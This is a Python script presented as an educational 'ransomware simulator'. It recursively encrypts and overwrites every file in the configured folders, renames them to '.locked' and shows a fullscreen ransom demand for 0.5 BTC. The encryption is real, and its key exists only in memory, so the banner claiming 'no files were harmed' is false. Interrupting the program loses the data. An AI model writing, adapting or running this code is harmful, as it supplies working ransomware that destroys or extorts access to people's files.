import os
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import base64
import time

# ===== CONFIGURATION =====
TARGET_FOLDERS = [  # Folders to encrypt (use test folders only!)
    r"C:\TestFolder1",
    r"C:\TestFolder2", 
    r"C:\TestFolder3"
]

# Your specified key (base64 encoded)
ENCODED_KEY = "RGFyei1Iazhqc20tajM0bmRsay1uNGJmaWR2"  # "Darz-Hk8jsm-j34ndlk-n4bfidv"
SECRET_KEY = base64.b64decode(ENCODED_KEY).decode()

class UniversalRansomwareSim:
    def __init__(self):
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='black')
        
        # Encryption state
        self.cipher = Fernet.generate_key()
        self.fernet = Fernet(self.cipher)
        self.encrypted_files = []
        
        self.create_interface()
        self.simulate_attack()
        self.root.mainloop()
    
    def create_interface(self):
        """Fullscreen ransomware UI"""
        # Main title
        tk.Label(
            self.root,
            text="CRITICAL SYSTEM ALERT",
            fg="red", bg="black",
            font=("Courier", 28, "bold")
        ).pack(pady=30)
        
        # Ransom note
        tk.Label(
            self.root,
            text="All your files have been encrypted!\n\n"
                 "To decrypt your files, you must pay 0.5 BTC\n"
                 "and enter the decryption key below:",
            fg="white", bg="black",
            font=("Courier", 16)
        ).pack(pady=20)
        
        # Key entry
        self.key_entry = tk.Entry(
            self.root,
            width=50,
            font=("Courier", 14),
            bg="#111111",
            fg="white"
        )
        self.key_entry.pack(pady=15)
        
        # Decrypt button
        tk.Button(
            self.root,
            text="[ DECRYPT FILES ]",
            command=self.decrypt_files,
            bg="#003300", fg="#00ff00",
            font=("Courier", 18, "bold")
        ).pack(pady=25)
        
        # Disclaimer (for YouTube)
        tk.Label(
            self.root,
            text="THIS IS A SIMULATION - NO FILES WERE HARMED\n"
                 "For educational purposes only",
            fg="red", bg="black",
            font=("Courier", 10)
        ).pack(side=tk.BOTTOM, pady=10)
    
    def simulate_attack(self):
        """Encrypts files in target folders (reversibly)"""
        total_encrypted = 0
        
        for folder in TARGET_FOLDERS:
            if os.path.exists(folder):
                for root, _, files in os.walk(folder):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            # Skip system files
                            if file.startswith('~$'): continue
                            
                            # Read file
                            with open(file_path, 'rb') as f:
                                data = f.read()
                            
                            # Encrypt and overwrite
                            encrypted = self.fernet.encrypt(data)
                            with open(file_path, 'wb') as f:
                                f.write(encrypted)
                            
                            # Track encrypted files
                            self.encrypted_files.append(file_path)
                            total_encrypted += 1
                            
                            # Rename to show encryption
                            os.rename(file_path, file_path + ".locked")
                            
                        except Exception as e:
                            print(f"Error encrypting {file_path}: {e}")
        
        # Show warning
        messagebox.showwarning(
            "ENCRYPTION COMPLETE",
            f"{total_encrypted} files encrypted!\n\n"
            f"Decryption key: {SECRET_KEY}\n"
            "(This is a simulation - no real files were harmed)"
        )
    
    def decrypt_files(self):
        """Decrypts files if correct key is entered"""
        if self.key_entry.get() == SECRET_KEY:
            restored = 0
            for file_path in self.encrypted_files:
                try:
                    locked_path = file_path + ".locked"
                    
                    # Read encrypted file
                    with open(locked_path, 'rb') as f:
                        data = f.read()
                    
                    # Decrypt and restore
                    decrypted = self.fernet.decrypt(data)
                    with open(file_path, 'wb') as f:
                        f.write(decrypted)
                    
                    # Remove encrypted version
                    os.remove(locked_path)
                    restored += 1
                    
                except Exception as e:
                    print(f"Error decrypting {file_path}: {e}")
            
            messagebox.showinfo(
                "DECRYPTION COMPLETE",
                f"Successfully restored {restored}/{len(self.encrypted_files)} files!"
            )
            self.root.destroy()
        else:
            messagebox.showerror(
                "WRONG KEY",
                "Invalid decryption key!\n\n"
                f"The correct key is: {SECRET_KEY}\n"
                "(This is a simulation)"
            )

if __name__ == "__main__":
    print("=== UNIVERSAL RANSOMWARE SIMULATOR ===")
    print("For educational purposes only!")
    print(f"Decryption Key: {SECRET_KEY}")
    UniversalRansomwareSim()
